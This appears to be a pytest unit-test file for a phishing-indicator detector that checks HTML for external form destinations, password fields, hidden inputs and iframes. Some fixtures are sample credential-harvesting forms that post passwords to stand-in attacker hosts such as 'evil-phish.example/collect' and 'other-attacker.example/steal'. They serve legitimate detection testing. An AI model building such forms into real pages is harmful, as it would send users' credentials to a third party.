"""
Unit tests for Webpage Analysis Agent (src/webpage_agent.py).
Tests normal pages, suspicious form destinations, relative form actions,
missing actions, empty HTML, and malformed inputs using synthetic HTML fixtures.
"""

import pytest
from src.webpage_agent import analyze_webpage


def test_normal_page():
    """
    A benign webpage with internal links, relative resources, and a standard search form.
    Should yield zero suspicious actions, zero credential forms, and empty findings.
    """
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Normal Page</title>
        <script src="/static/main.js"></script>
    </head>
    <body>
        <h1>Welcome to Example Corp</h1>
        <p>This is a normal company webpage with general info.</p>
        <a href="/about">About Us</a>
        <a href="/contact">Contact</a>
        <form action="/search" method="get">
            <input type="text" name="q" placeholder="Search...">
            <button type="submit">Search</button>
        </form>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://example.com/home")

    assert result["agent"] == "Webpage Analysis Agent"
    assert result["page_url"] == "https://example.com/home"
    assert result["forms_count"] == 1
    assert result["password_fields_count"] == 0
    assert result["hidden_fields_count"] == 0
    assert result["iframes_count"] == 0
    assert result["external_scripts_count"] == 0
    assert result["external_links_count"] == 0
    assert result["suspicious_form_actions"] == []
    assert result["missing_form_actions"] == []
    assert result["credential_forms"] == []
    assert result["findings"] == []
    assert "not proof of phishing" in result["note"]


def test_suspicious_form_destinations():
    """
    Forms submitting data to a different external hostname or protocol-relative domain.
    """
    html = """
    <html>
    <body>
        <form action="https://evil-phish.example/collect" method="post">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Login">
        </form>
        <form action="//other-attacker.example/steal" method="POST">
            <input type="password" name="pin">
        </form>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://secure-bank.example/login")

    assert result["forms_count"] == 2
    assert result["password_fields_count"] == 2
    assert len(result["suspicious_form_actions"]) == 2
    assert result["suspicious_form_actions"][0]["destination"] == "https://evil-phish.example/collect"
    assert result["suspicious_form_actions"][0]["method"] == "post"
    assert result["suspicious_form_actions"][1]["destination"] == "https://other-attacker.example/steal"
    assert result["suspicious_form_actions"][1]["method"] == "post"

    # Findings should include external form destinations and credential forms
    finding_types = [f["type"] for f in result["findings"]]
    assert "external_form_destinations" in finding_types
    assert "credential_forms" in finding_types
    assert "password_fields" in finding_types


def test_relative_form_actions():
    """
    Forms submitting to relative paths (e.g., /login, submit.php, ./verify) or same-domain absolute URLs.
    These must NOT be flagged as suspicious form actions.
    """
    html = """
    <html>
    <body>
        <!-- Relative path starting with slash -->
        <form action="/api/v1/login" method="post">
            <input type="password" name="pwd">
        </form>
        <!-- Relative path without slash -->
        <form action="submit.php" method="post">
            <input type="text" name="user">
        </form>
        <!-- Relative dot notation -->
        <form action="./auth" method="post">
            <input type="text" name="code">
        </form>
        <!-- Absolute URL matching the exact same domain -->
        <form action="https://portal.example/api/auth" method="post">
            <input type="text" name="token">
        </form>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://portal.example/subpath/index.html")

    assert result["forms_count"] == 4
    assert result["suspicious_form_actions"] == []
    assert result["missing_form_actions"] == []


def test_missing_actions():
    """
    Forms with missing action attribute, empty action, hash, or javascript void.
    Must generate useful findings for missing_form_actions without marking as suspicious destination.
    """
    html = """
    <html>
    <body>
        <!-- Missing action attribute completely -->
        <form method="post">
            <input type="password" name="p1">
        </form>
        <!-- Empty action string -->
        <form action="" method="post">
            <input type="password" name="p2">
        </form>
        <!-- Hash placeholder action -->
        <form action="#" method="post">
            <input type="password" name="p3">
        </form>
        <!-- JavaScript placeholder action -->
        <form action="javascript:void(0)" method="post">
            <input type="password" name="p4">
        </form>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://example.com/auth")

    assert result["forms_count"] == 4
    assert len(result["missing_form_actions"]) == 4
    assert result["suspicious_form_actions"] == []

    # Check that findings contains missing_form_actions
    missing_finding = next((f for f in result["findings"] if f["type"] == "missing_form_actions"), None)
    assert missing_finding is not None
    assert missing_finding["count"] == 4
    assert len(missing_finding["items"]) == 4

    # Each form had passwords, so credential_forms should also report 4
    assert len(result["credential_forms"]) == 4
    for cform in result["credential_forms"]:
        assert cform["is_missing_action"] is True
        assert cform["is_external"] is False


def test_empty_html():
    """
    Test empty string, whitespace only, or None input.
    Must gracefully return zero counts and empty lists without error.
    """
    for empty_input in ["", "   \n\t  ", None]:
        result = analyze_webpage(empty_input, "https://example.com")
        assert result["forms_count"] == 0
        assert result["password_fields_count"] == 0
        assert result["hidden_fields_count"] == 0
        assert result["iframes_count"] == 0
        assert result["external_scripts_count"] == 0
        assert result["external_links_count"] == 0
        assert result["suspicious_form_actions"] == []
        assert result["missing_form_actions"] == []
        assert result["credential_forms"] == []
        assert result["findings"] == []


def test_malformed_inputs():
    """
    Test malformed HTML (unclosed tags, broken syntax), non-string HTML,
    and invalid or missing page_url.
    """
    # Non-string HTML (integer)
    result_int = analyze_webpage(12345, "https://example.com")
    assert isinstance(result_int, dict)
    assert result_int["forms_count"] == 0

    # Truncated and broken HTML
    broken_html = "<form action='https://other.com/post' <input type='password' name='p'"
    result_broken = analyze_webpage(broken_html, "https://example.com")
    assert isinstance(result_broken, dict)

    # Missing or empty page_url
    result_no_url = analyze_webpage("<form action='/submit'></form>", "")
    assert isinstance(result_no_url, dict)
    assert result_no_url["forms_count"] == 1
    assert result_no_url["suspicious_form_actions"] == []

    # None page_url
    result_none_url = analyze_webpage("<form action='/submit'></form>", None)
    assert isinstance(result_none_url, dict)
    assert result_none_url["forms_count"] == 1

    # Malformed page_url without scheme
    result_no_scheme = analyze_webpage(
        "<form action='https://evil.com/post'></form>",
        "demo.example/login"
    )
    assert len(result_no_scheme["suspicious_form_actions"]) == 1
    assert result_no_scheme["suspicious_form_actions"][0]["destination"] == "https://evil.com/post"


def test_case_insensitive_attributes():
    """
    Verify case-insensitive input types (PASSWORD, HIDDEN) and method attributes.
    """
    html = """
    <form action="/login" METHOD="POST">
        <input type="PASSWORD" name="secret">
        <input type="HIDDEN" name="csrf" value="tok">
    </form>
    """
    result = analyze_webpage(html, "https://example.com")

    assert result["password_fields_count"] == 1
    assert result["hidden_fields_count"] == 1
    assert len(result["credential_forms"]) == 1
    assert result["credential_forms"][0]["method"] == "post"
    assert result["credential_forms"][0]["password_fields_count"] == 1


def test_base_tag_resolution():
    """
    Verify that relative paths resolve against <base href="..."> if present.
    """
    html = """
    <html>
    <head>
        <base href="https://cdn.example/assets/">
    </head>
    <body>
        <a href="doc.pdf">Document</a>
        <iframe src="frame.html"></iframe>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://demo.example/app/")
    # Base href is cdn.example, so relative link & frame resolve to cdn.example
    assert result["external_links_count"] == 1
    assert result["iframes_count"] == 1
    assert "https://cdn.example/assets/frame.html" in result["findings"][0]["items"]


def test_indicators_not_treated_alone_as_phishing():
    """
    Credential forms, hidden fields, and external resources are investigation findings,
    not declared as phishing proof. Note and structure must reflect this.
    """
    html = """
    <html>
    <body>
        <form action="/auth" method="post">
            <input type="text" name="user">
            <input type="password" name="pass">
            <input type="hidden" name="csrf" value="123">
        </form>
    </body>
    </html>
    """
    result = analyze_webpage(html, "https://legit-service.example/login")

    # Has credential form and hidden field
    assert result["password_fields_count"] == 1
    assert result["hidden_fields_count"] == 1
    assert len(result["credential_forms"]) == 1
    # But form action is relative (same domain)
    assert result["suspicious_form_actions"] == []
    # Note must clearly state these are investigation indicators
    assert "These are investigation indicators, not proof of phishing" in result["note"]


def test_iframe_missing_and_empty_src_detection():
    """
    Verify that iframes with missing or empty src attributes (like editor frames)
    are counted in iframes_count and not misclassified as external.
    """
    html = """
    <html><body>
        <iframe id="mce_0_ifr" class="tox-edit-area__iframe"></iframe>
        <iframe src=""></iframe>
        <iframe src="https://other.example/embed"></iframe>
    </body></html>
    """
    result = analyze_webpage(html, "https://example.com/editor")
    assert result["iframes_count"] == 3
    # Only the external iframe should be in external_iframes
    ext_iframe_finding = next((f for f in result["findings"] if f["type"] == "external_iframes"), None)
    assert ext_iframe_finding is not None
    assert ext_iframe_finding["count"] == 1
    assert "https://other.example/embed" in ext_iframe_finding["items"]
